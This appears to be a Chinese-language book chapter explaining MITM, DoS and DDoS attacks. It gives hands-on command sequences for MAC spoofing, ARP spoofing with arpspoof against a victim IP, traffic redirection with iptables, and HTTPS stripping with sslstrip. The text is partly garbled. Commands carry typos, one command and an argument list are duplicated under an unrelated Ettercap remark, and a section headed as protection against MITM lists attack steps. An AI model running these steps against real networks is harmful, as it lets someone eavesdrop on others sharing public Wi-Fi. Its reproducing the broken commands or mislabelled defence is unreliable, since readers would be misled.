    ## 什么是 MITM（中间人）攻击？


    MITM 是一种网络攻击，旨在监听连接到同一网络的用户流量。


    这意味着什么呢？这意味着如果你去了镇上的咖啡馆，有人可以与你连接到同一个 Wi-Fi，只需几条命令，你就能看到你在 Facebook、Google 等平台上的所有对话。


    情况确实如此，但不必担心，因为事情没有那么简单。为什么？因为我们大多数的互联网连接都是安全的（使用 HTTPS 而不是 HTTP；))），但这并不意味着没有人在监听你的流量。


    为了避免此类情况，我建议你在公共场所使用 VPN。在图 5.3 中，你可以看到一个 MITM 攻击的示例：


    ### 中间人


    ![](img/85e17094b9b0b18870d12b91b22fb038_55_0.png)


    ## 图 5.3


    你有多种方法可以进行 MITM（我将在下面列出许多可能性中的几种）：


    - MAC 欺骗 (MAC Spoofing)

    - ARP 欺骗 (ARP Spoofing)

    - 恶意 DHCP 服务器 (Rogue DHCP Server)

    - STP 攻击 (STP Attack)

    - DNS 毒化 (DNS Poisoning)


    这些是最常见的几种。在下文中，我将讨论其中一些，并为你提供一些如何操作的实际示例。


    ### 1) MAC 欺骗


    “Spoofing”一词源于欺骗，在这种情况下，它指的是通过将某个计算机的 MAC 地址伪装成另一台计算机（甚至是路由器），从而欺骗网络中的至少一个设备。


    可以使用更改 PC MAC 地址的程序轻松实现这一点，以查看其流量。这里有一个关于 Windows 10 上如何更改 MAC 地址的示例（https://windowsreport.com/mac-address-changer-windows-10/），但我认为与
    Linux 相比，其过程要复杂得多：


    ```bash

    # ifconfig eth0 down

    # macchanger -m 00:d0:70:00:20:69 eth0

    # ifconfig eth0 up

    ```


    首先，我们停止接口（此例中为 eth0），然后使用 macchanger 命令帮助我们更改 MAC 地址，-m 参数允许我们指定地址。要进行验证，请使用命令：#ifconfig


    PS: 如果你想生成随机 MAC 地址，请使用：#macchanger -r eth0


    ### 2) ARP 欺骗


    ARP 欺骗的工作原理与 MAC 欺骗类似，攻击者利用 ARP 协议误导整个网络，使其认为 MAC 地址 X 实际上是路由器。因此，所有想要访问互联网的网络设备都会将流量发送给攻击者（攻击者将其重定向到路由器）。在这种情况下，攻击者可以使用
    Wireshark 等流量捕获程序看到通过其的所有流量。


    在下图 5.4 中，你可以看到这个过程是如何发生的：


    ![](img/85e17094b9b0b18870d12b91b22fb038_57_0.png)


    要启动此类攻击，我们必须首先在 Linux 上启动路由进程，以便流量可以从受害者发送到路由器，反之亦然（通过我们，即“攻击者”）：


    ```bash

    # echo "1" > proc/sys/net/ipv4/ip_forward

    # cat /proc/sys/net/ipv4/ip_forward

    ```


    我们将流量重定向到我们想要监听的端口：


    ```bash

    # iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDRECT --to-port
    8181

    ```


    之后，我们需要安装程序：


    ```bash

    # sudo apt-get update

    # sudo apt-get install dnsiff

    ```


    现在我们下达命令启动攻击：


    ```bash

    # arpspoof -i eth0 -t 192.168.1.3 192.168.1.1

    # arpspoof -i eth0 -t 192.168.1.1 192.168.1.3

    ```


    - -i eth0：我们开始启动攻击的接口

    - -t 192.168.1.3：受害者的 IP（我们想要攻击的设备 - 请更改为你网络中的 IP）

    - 192.168.1.1：路由器 IP（请将路由器 IP 更改为你的路由器）


    理论上，这两个命令向两台设备发送伪造包，告知它们流量必须通过攻击者。现在你所做的就是打开 Wireshark，查看受害者的流量是如何“通过你”的。


    这里还需要另一个元素来辅助流量的**解密**。为什么呢？因为大部分互联网流量都是加密的。

    我们将使用这个工具：SSLstrip（用于移除安全元素 SSL），以及在 HTTP 中解密 HTTPS 流量的命令是：


    ```bash

    # sudo python sslstrip.py -l 8181

    ```


    此命令将监听端口 8181 上的流量并尝试对其进行解密。之后，你可以启动 Wireshark 并查看加密的流量（不过，我建议你先启动 Wireshark，然后在流量加密时查看区别）。


    PS: 简单搜索你就能找到 Ettercap。要使用它：


    ```bash

    # sudo python sslstrip.py -l 8181

    ```


    - -i eth0：我们开始启动攻击的接口

    - -t 192.168.1.3：受害者的 IP（我们想要攻击的设备 - 请更改为你网络中的 IP）

    - 192.168.1.1：路由器 IP（请将路由器 IP 更改为你的路由器）


    ### 3) 恶意 DHCP 服务器


    此类攻击涉及一个 DHCP 服务器（在网络上）。因此，所有想要访问互联网的网络设备都会将流量发送给攻击者（攻击者将其重定向到路由器）。在这种情况下，攻击者可以使用
    Wireshark 等流量捕获程序看到通过其的所有流量。


    如果有人想破解这种攻击，他们将通过排除（直接关闭端口）来受到惩罚。


    我们如何保护自己免受 MITM 攻击？


    -  1. 在 Linux 上启动路由进程，以便流量可以从受害者发送到路由器，反之亦然（通过我们，即“攻击者”）；

    - # echo "1" > proc/sys/net/ipv4/ip_forward

    - # cat /proc/sys/net/ipv4/ip_forward

    - 2. 安装程序

    - # sudo apt-get update

    - # sudo apt-get install dhcp-server

    - 3. 配置 DHCP 服务器

    - # nano /etc/dhcp.conf

    - 4. 添加默认路由

    - # ip route add default via 192.168.1.1

    - 5. 启动 SSLstrip

    - 6. 捕获流量


    ## 什么是 DoS（拒绝服务）攻击？


    DoS 是一种网络攻击，其目的是中断（一段时间内）服务器上特定服务的运行，且只有一个源（某台计算机）。因此，接收到大量请求后（例如 Web 服务器）将无法处理并在此时被阻塞（服务中断）。这里是图
    5.5 中的示例：


    ### # DoS


    ![](img/85e17094b9b0b18870d12b91b22fb038_62_0.png)


    攻击者


    服务器


    图 5.5


    ## 什么是 DDoS（分布式拒绝服务）攻击？


    DDoS 是一种网络攻击，旨在中断（一段时间内）服务器或整个网络上特定服务的运行，它具有多个互联网流量源。DDoS 通过多个感染了恶意软件的“计算机”发生，这些计算机产生惊人的
    Gbps 级流量（10、40、100+ Gbps - 大大取决于计算机的数量）。


    即使是最近（2018 年 2 月），历史上最大的 DDoS 攻击也发生了，记录为 1.5 Tbps（或 1500 Gbps）。哇！


